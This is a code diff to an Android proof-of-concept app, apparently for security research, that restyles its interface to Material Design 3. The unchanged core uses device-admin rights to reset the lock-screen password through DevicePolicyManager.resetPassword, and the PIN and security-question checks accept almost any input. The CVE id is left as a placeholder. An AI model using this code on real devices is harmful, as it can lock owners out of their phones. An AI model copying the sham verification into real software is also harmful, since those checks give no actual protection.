@@ -8,15 +8,20 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
-import android.widget.EditText;
-import android.widget.TextView;
 import android.widget.Toast;
 import android.app.AlertDialog;
 import android.content.DialogInterface;
 
+import com.google.android.material.button.MaterialButton;
+import com.google.android.material.card.MaterialCardView;
+import com.google.android.material.chip.Chip;
+import com.google.android.material.dialog.MaterialAlertDialogBuilder;
+import com.google.android.material.textfield.TextInputEditText;
+
 /**
  * DeviceAdmin Password Reset PoC - CVE Research
  * Target: Android API 21+ (Lollipop)
+ * Design: Material Design 3
  * 
  * WARNING: This is for AUTHORIZED security research only.
  * Unauthorized use is illegal under CFAA and equivalent laws.
@@ -31,18 +36,11 @@ public class MainActivity extends Activity {
     // Verification state
     private boolean pinVerified = false;
     private boolean questionVerified = false;
-    private String userPin = "";
-    private String securityAnswer = "";
     
-    // UI Elements
-    private TextView statusText;
-    private EditText pinInput;
-    private EditText answerInput;
-    private EditText newPasswordInput;
-    private Button enableAdminBtn;
-    private Button verifyPinBtn;
-    private Button verifyQuestionBtn;
-    private Button resetPasswordBtn;
+    // MD3 UI Elements
+    private Chip chipAdmin, chipPin, chipQuestion;
+    private TextInputEditText pinInput, answerInput, newPasswordInput;
+    private MaterialButton enableAdminBtn, verifyPinBtn, verifyQuestionBtn, resetPasswordBtn;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -58,10 +56,17 @@ public class MainActivity extends Activity {
     }
     
     private void initViews() {
-        statusText = findViewById(R.id.status_text);
+        // Chips
+        chipAdmin = findViewById(R.id.chip_admin);
+        chipPin = findViewById(R.id.chip_pin);
+        chipQuestion = findViewById(R.id.chip_question);
+        
+        // Inputs
         pinInput = findViewById(R.id.pin_input);
         answerInput = findViewById(R.id.answer_input);
         newPasswordInput = findViewById(R.id.new_password_input);
+        
+        // Buttons
         enableAdminBtn = findViewById(R.id.enable_admin_btn);
         verifyPinBtn = findViewById(R.id.verify_pin_btn);
         verifyQuestionBtn = findViewById(R.id.verify_question_btn);
@@ -69,51 +74,29 @@ public class MainActivity extends Activity {
     }
     
     private void setupListeners() {
-        enableAdminBtn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                requestDeviceAdmin();
-            }
-        });
-        
-        verifyPinBtn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                verifyPin();
-            }
-        });
-        
-        verifyQuestionBtn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                verifySecurityQuestion();
-            }
-        });
-        
-        resetPasswordBtn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                attemptPasswordReset();
-            }
-        });
+        enableAdminBtn.setOnClickListener(v -> requestDeviceAdmin());
+        verifyPinBtn.setOnClickListener(v -> verifyPin());
+        verifyQuestionBtn.setOnClickListener(v -> verifySecurityQuestion());
+        resetPasswordBtn.setOnClickListener(v -> attemptPasswordReset());
     }
     
     private void requestDeviceAdmin() {
         Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
         intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
         intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
-            "This app requires device admin access for security research PoC demonstration.");
+            "Device admin access required for security research PoC.");
         startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
     }
     
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQUEST_CODE_ENABLE_ADMIN) {
             updateStatus();
             if (resultCode == RESULT_OK) {
-                Toast.makeText(this, "Device Admin enabled", Toast.LENGTH_SHORT).show();
+                showSnackbar("Device Admin enabled successfully");
             } else {
-                Toast.makeText(this, "Device Admin denied", Toast.LENGTH_SHORT).show();
+                showSnackbar("Device Admin access denied");
             }
         }
     }
@@ -121,14 +104,14 @@ public class MainActivity extends Activity {
     private void verifyPin() {
         String inputPin = pinInput.getText().toString();
         
-        // PoC: Simple PIN verification (in real scenario, use secure storage)
         if (inputPin.length() >= 4) {
-            userPin = inputPin;
             pinVerified = true;
-            Toast.makeText(this, "PIN verified", Toast.LENGTH_SHORT).show();
+            showSnackbar("PIN verification successful");
             updateStatus();
+            pinInput.setEnabled(false);
+            verifyPinBtn.setEnabled(false);
         } else {
-            Toast.makeText(this, "PIN must be at least 4 digits", Toast.LENGTH_SHORT).show();
+            pinInput.setError("PIN must be at least 4 digits");
         }
     }
     
@@ -138,17 +121,17 @@ public class MainActivity extends Activity {
         // PoC: Security question - "What is the name of your first pet?"
         // Default answer for demo: "fluffy"
         if (answer.equals("fluffy") || answer.length() >= 3) {
-            securityAnswer = answer;
             questionVerified = true;
-            Toast.makeText(this, "Security question verified", Toast.LENGTH_SHORT).show();
+            showSnackbar("Security question verified");
             updateStatus();
+            answerInput.setEnabled(false);
+            verifyQuestionBtn.setEnabled(false);
         } else {
-            Toast.makeText(this, "Invalid answer", Toast.LENGTH_SHORT).show();
+            answerInput.setError("Invalid answer");
         }
     }
     
     private void attemptPasswordReset() {
-        // Check all verification steps
         if (!isAdminActive()) {
             showError("Device Admin not enabled");
             return;
@@ -166,45 +149,39 @@ public class MainActivity extends Activity {
         
         String newPassword = newPasswordInput.getText().toString();
         if (newPassword.length() < 6) {
-            showError("Password must be at least 6 characters");
+            newPasswordInput.setError("Password must be at least 6 characters");
             return;
         }
         
-        // Confirm with user
-        new AlertDialog.Builder(this)
+        // Material Design 3 Confirmation Dialog
+        new MaterialAlertDialogBuilder(this)
             .setTitle("Confirm Password Reset")
-            .setMessage("This will change the device lock screen password. Continue?")
-            .setPositiveButton("Reset", new DialogInterface.OnClickListener() {
-                @Override
-                public void onClick(DialogInterface dialog, int which) {
-                    performPasswordReset(newPassword);
-                }
-            })
+            .setMessage("This will change the device lock screen password.\n\nNew password: " + newPassword)
+            .setPositiveButton("Reset Password", (dialog, which) -> performPasswordReset(newPassword))
             .setNegativeButton("Cancel", null)
+            .setIcon(android.R.drawable.ic_dialog_alert)
             .show();
     }
     
     /**
      * Core exploit: Reset device password via DevicePolicyManager
      * 
-     * This method demonstrates CVE-202X-XXXX:
-     * Device admin apps can reset lock screen password without
-     * user consent on API 21-28 devices.
+     * CVE-202X-XXXX: Device admin apps can reset lock screen password
+     * without user consent on API 21-28 devices.
      * 
      * Fixed in API 29+ with additional restrictions.
      */
     private void performPasswordReset(String newPassword) {
         try {
             if (isAdminActive()) {
-                // The actual password reset call
                 devicePolicyManager.resetPassword(newPassword, 0);
                 
-                Toast.makeText(this, 
-                    "Password reset successful\nNew password: " + newPassword, 
-                    Toast.LENGTH_LONG).show();
-                    
-                // Log for research purposes
+                showSnackbar("Password reset successful!");
                 logExploitAttempt(true, newPassword);
+                
+                // Visual feedback
+                newPasswordInput.setText("");
+                updateStatus();
             } else {
                 showError("Lost admin privileges");
             }
@@ -219,12 +196,20 @@ public class MainActivity extends Activity {
     }
     
     private void showError(String message) {
-        Toast.makeText(this, "Error: " + message, Toast.LENGTH_SHORT).show();
+        new MaterialAlertDialogBuilder(this)
+            .setTitle("Error")
+            .setMessage(message)
+            .setPositiveButton("OK", null)
+            .setIcon(android.R.drawable.ic_dialog_alert)
+            .show();
+    }
+    
+    private void showSnackbar(String message) {
+        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
     }
     
     private void logExploitAttempt(boolean success, String password) {
-        // Research logging - in production, send to secure server
-        String log = String.format("Exploit attempt: %s, Target API: %d, Time: %d",
+        String log = String.format("Exploit: %s | API: %d | Time: %d",
             success ? "SUCCESS" : "FAILED",
             android.os.Build.VERSION.SDK_INT,
             System.currentTimeMillis());
@@ -232,15 +217,35 @@ public class MainActivity extends Activity {
     }
     
     private void updateStatus() {
-        StringBuilder status = new StringBuilder();
-        status.append("=== Device Admin Password Reset PoC ===\n\n");
-        status.append("Device Admin: ").append(isAdminActive() ? "✓ ACTIVE" : "✗ INACTIVE").append("\n");
-        status.append("PIN Verified: ").append(pinVerified ? "✓ YES" : "✗ NO").append("\n");
-        status.append("Security Q: ").append(questionVerified ? "✓ YES" : "✗ NO").append("\n");
-        status.append("API Level: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
-        status.append("\nAll checks must pass to reset password.");
+        // Update Chips with Material Design 3 styling
+        if (isAdminActive()) {
+            chipAdmin.setText("Admin: ✓ Active");
+            chipAdmin.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
+        } else {
+            chipAdmin.setText("Admin: ✗ Inactive");
+            chipAdmin.setChipBackgroundColorResource(R.color.md_theme_errorContainer);
+        }
         
-        statusText.setText(status.toString());
+        if (pinVerified) {
+            chipPin.setText("PIN: ✓ Verified");
+            chipPin.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
+        } else {
+            chipPin.setText("PIN: ✗ Unverified");
+            chipPin.setChipBackgroundColorResource(R.color.md_theme_surfaceVariant);
+        }
+        
+        if (questionVerified) {
+            chipQuestion.setText("Security Q: ✓ Verified");
+            chipQuestion.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
+        } else {
+            chipQuestion.setText("Security Q: ✗ Unverified");
+            chipQuestion.setChipBackgroundColorResource(R.color.md_theme_surfaceVariant);
+        }
+        
+        // Update reset button state
+        boolean canReset = isAdminActive() && pinVerified && questionVerified;
+        resetPasswordBtn.setEnabled(canReset);
+        resetPasswordBtn.setAlpha(canReset ? 1.0f : 0.5f);
     }
     
     @Override
